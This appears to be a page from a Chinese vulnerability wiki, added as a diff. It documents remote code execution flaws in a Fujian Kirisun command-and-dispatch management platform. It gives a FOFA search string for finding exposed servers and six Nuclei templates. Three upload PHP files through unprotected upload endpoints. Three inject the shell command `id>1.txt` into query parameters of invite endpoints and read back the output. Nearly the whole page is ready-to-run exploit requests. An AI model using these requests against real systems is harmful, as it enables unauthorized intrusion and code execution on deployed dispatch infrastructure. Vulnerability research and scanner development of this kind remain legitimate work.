@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1/%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0RCE/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>福建科立讯通信有限公司指挥调度管理平台RCE - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u798f\u5efa\u79d1\u7acb\u8baf\u901a\u4fe1\u6709\u9650\u516c\u53f8\u6307\u6325\u8c03\u5ea6\u7ba1\u7406\u5e73\u53f0RCE", url: "#_top", children: [
+          ]},
+          {title: "fofa", url: "#fofa", children: [
+          ]},
+          {title: "event_uploadfile\u63a5\u53e3\u4efb\u610f\u4e0a\u4f20.yaml", url: "#event_uploadfileyaml", children: [
+          ]},
+          {title: "invite2videoconf\u63a5\u53e3RCE.yaml", url: "#invite2videoconfrceyaml", children: [
+          ]},
+          {title: "invite_one_member\u63a5\u53e3RCE.yaml", url: "#invite_one_memberrceyaml", children: [
+          ]},
+          {title: "invite_one_ptter\u63a5\u53e3RCE.yaml", url: "#invite_one_ptterrceyaml", children: [
+          ]},
+          {title: "task-upload\u63a5\u53e3\u4efb\u610f\u4e0a\u4f20.yaml", url: "#task-uploadyaml", children: [
+          ]},
+          {title: "upload\u63a5\u53e3\u4efb\u610f\u4e0a\u4f20.yaml", url: "#uploadyaml", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0uploadgps.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0uploadgps.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        福建科立讯通信有限公司指挥调度管理平台uploadgps.php存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ajax_users.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ajax_users.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        福建科立讯通信指挥调度管理平台ajax users.php存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="rce">福建科立讯通信有限公司指挥调度管理平台RCE<a class="headerlink" href="#rce" title="Permanent link">&para;</a></h2>
+<h2 id="fofa">fofa<a class="headerlink" href="#fofa" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>指挥调度管理平台
+</code></pre></div>
+<h2 id="event_uploadfileyaml">event_uploadfile接口任意上传.yaml<a class="headerlink" href="#event_uploadfileyaml" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>id: event-uploadfile
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台RCE_event-uploadfile接口任意上传
+  author: wayxz
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /api/client/event/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Length: 372
+
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name=&quot;uuid&quot;
+
+          1
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name=&quot;number&quot;
+
+          1
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name=&quot;uploadfile&quot;;filename=&quot;1.php&quot;
+        Content-Type: image/png
+
+          111
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7--
+
+      - |
+        GET /upload/task/{{timestrp}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+    extractors:
+     - type: regex
+       name: timestrp
+       internal: true
+       part: body
+       regex:
+          - &#39;[0-9a-zA-Z]{8}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{12}.php&#39;  
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - &quot;111&quot;
+      - type: status
+        status:
+          - 200
+</code></pre></div>
+<h2 id="invite2videoconfrceyaml">invite2videoconf接口RCE.yaml<a class="headerlink" href="#invite2videoconfrceyaml" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>id: invite2videoconf_rce
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台RCE
+  author: wayxz
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /api/client/invite2videoconf.php?callee=1&amp;roomid=`id&gt;1.txt` HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+      - |
+        GET  /api/client/1.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - &#39;contains(body_2,&quot;id&quot;)&#39;
+</code></pre></div>
+<h2 id="invite_one_memberrceyaml">invite_one_member接口RCE.yaml<a class="headerlink" href="#invite_one_memberrceyaml" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>id: invite_one_member_rce
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台RCE
+  author: wayxz
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /api/client/audiobroadcast/invite_one_member.php?callee=1&amp;roomid=`id&gt;1.txt` HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+      - |
+        GET /api/client/audiobroadcast/1.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - &#39;contains(body_2,&quot;uid&quot;)&#39;
+</code></pre></div>
+<h2 id="invite_one_ptterrceyaml">invite_one_ptter接口RCE.yaml<a class="headerlink" href="#invite_one_ptterrceyaml" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>id: invite_one_ptter_rce
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台RCE
+  author: wayxz
+  severity: high
+
+http:
+  - raw:
+      - |
+        GET /api/client/ptt/invite_one_ptter.php?callee=all&amp;caller=1&amp;pttnumber=`id&gt;1.txt`&amp;force=1&amp;timeout=1 HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+      - |
+        GET  /api/client/ptt/1.txt HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - &#39;contains(body_2,&quot;id&quot;)&#39;
+</code></pre></div>
+<h2 id="task-uploadyaml">task-upload接口任意上传.yaml<a class="headerlink" href="#task-uploadyaml" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>id: task-upload-rce
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台RCE_task-upload接口任意上传
+  author: wayxz
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /api/client/task/uploadfile.php HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+        Connection: close
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary25qW4eG1Jt50iyf7
+        Cookie: PHPSESSID=403fc14298f14704c52657fc5ff62c71
+        Content-Length: 374
+
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name=&quot;uuid&quot;
+
+            1
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name=&quot;number&quot;
+
+            122
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7
+        Content-Disposition: form-data; name=&quot;uploadfile&quot;;filename=&quot;1.php&quot;
+        Content-Type: image/jpg
+
+            111
+        ------WebKitFormBoundary25qW4eG1Jt50iyf7--
+
+      - |
+        GET /upload/task/{{timestrp}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+    extractors:
+     - type: regex
+       name: timestrp
+       internal: true
+       part: body
+       regex:
+         - &#39;[0-9a-zA-Z]{8}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{4}-[0-9a-zA-Z]{12}.php&#39;  
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - &#39;111&#39;
+      - type: status
+        status:
+          - 200
+</code></pre></div>
+<h2 id="uploadyaml">upload接口任意上传.yaml<a class="headerlink" href="#uploadyaml" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>id: uploadFile_rce
+info:
+  name: 福建科立讯通信有限公司指挥调度管理平台RCE
+  author: wayxz
+  severity: high
+
+http:
+  - raw:
+      - |
+        POST /api/client/upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+        Content-Length: 180
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySwvD8hSn3Z0sHfMu
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu
+        Content-Disposition: form-data; name=&quot;ulfile&quot;;filename=&quot;1.php&quot;
+        Content-Type: image/png
+
+        111
+        ------WebKitFormBoundarySwvD8hSn3Z0sHfMu--
+
+      - |
+        GET  /upload/1.php HTTP/1.1
+        Host: {{Hostname}}
+        Connection: close
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - &#39;111&#39;
+      - type: status
+        status:
+          - 200
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0uploadgps.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%9C%89%E9%99%90%E5%85%AC%E5%8F%B8%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0uploadgps.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        福建科立讯通信有限公司指挥调度管理平台uploadgps.php存在SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ajax_users.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E7%A6%8F%E5%BB%BA%E7%A7%91%E7%AB%8B%E8%AE%AF%E9%80%9A%E4%BF%A1%E6%8C%87%E6%8C%A5%E8%B0%83%E5%BA%A6%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0ajax_users.php%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        福建科立讯通信指挥调度管理平台ajax users.php存在SQL注入漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
